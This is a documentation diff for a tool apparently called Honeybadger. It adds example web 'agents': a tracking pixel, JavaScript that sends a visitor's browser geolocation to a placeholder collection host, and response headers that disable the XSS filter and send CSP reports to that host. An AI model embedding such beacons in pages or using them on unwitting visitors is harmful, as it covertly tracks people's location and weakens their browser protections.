@@ -122,3 +122,46 @@ The `os` parameter must match one of the following regular expressions:
 ### Universal Parameters
 
 All requests can include an optional `comment` parameter. This parameter is sanitized and displayed within the UI as miscellaneous information about the target or agent.
+
+## Example Web Agents
+
+### HTML
+
+```
+img = new Image();
+img.src = "http://<path:honeybadger>/api/beacon/<guid:target>/HTML";
+```
+
+or
+
+```
+<img src="http://<path:honeybadger>/api/beacon/<guid:target>/HTML" width=1 height=1 />
+```
+
+### JavaScript
+
+Note: JavaScript (HTML5) geolocation agents will not work unless deployed in a secure context (HTTPS), or local host.
+
+```
+function showPosition(position) {
+    img = new Image();
+    img.src = "http://<path:honeybadger>/api/beacon/<guid:target>/JavaScript?lat=" + position.coords.latitude + "&lng=" + position.coords.longitude + "&acc=" + position.coords.accuracy;
+}
+
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+}
+```
+
+### Content Security Policy
+
+```
+response.headers['X-XSS-Protection'] = '0'
+response.headers['Content-Security-Policy-Report-Only'] = '<string:policy>; report-uri http://<path:honeybadger>/api/beacon/<guid:target>/Content-Security-Policy'
+```
+
+### XSS Auditor
+
+```
+response.headers['X-XSS-Protection'] = '1; report=http://<path:honeybadger>/api/beacon/<guid:target>/XSS-Protection'
+```
